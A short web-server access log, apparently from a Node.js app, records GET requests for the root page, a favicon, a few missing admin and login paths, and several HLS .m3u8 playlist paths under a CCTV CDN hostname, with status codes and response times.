Server is running on port:  \\.\pipe\9e8d03d6-16bf-473d-8628-fcaac28063a4
[0mGET /hlslive-tx-cdn.ysp.cctv.cn/ysp/2024078203.m3u8 [33m404[0m 4.535 ms - 185[0m
[0mGET /hlslive-tx-cdn.ysp.cctv.cn/028/2024068503.m3u8 [33m404[0m 2.777 ms - 185[0m
[0mGET /hlslive-tx-cdn.ysp.cctv.cn/ysp/2024068503.m3u8 [33m404[0m 2.811 ms - 185[0m
[0mGET / [32m200[0m 10.918 ms - 31962[0m
[0mGET / [32m200[0m 10.483 ms - 31962[0m
[0mGET / [32m200[0m 12.274 ms - 31962[0m
[0mGET / [32m200[0m 12.268 ms - 31962[0m
[0mGET / [32m200[0m 11.680 ms - 31962[0m
[0mGET / [32m200[0m 11.246 ms - 31962[0m
[0mGET / [32m200[0m 10.912 ms - 31962[0m
[0mGET /favicon.ico [33m404[0m 2.764 ms - 150[0m
[0mGET / [32m200[0m 13.378 ms - 31962[0m
[0mGET /manage/account/login [33m404[0m 2.825 ms - 159[0m
[0mGET /admin/index.html [33m404[0m 10.008 ms - 155[0m
[0mGET / [32m200[0m 10.522 ms - 31962[0m
[0mGET /index.html [33m404[0m 2.805 ms - 149[0m
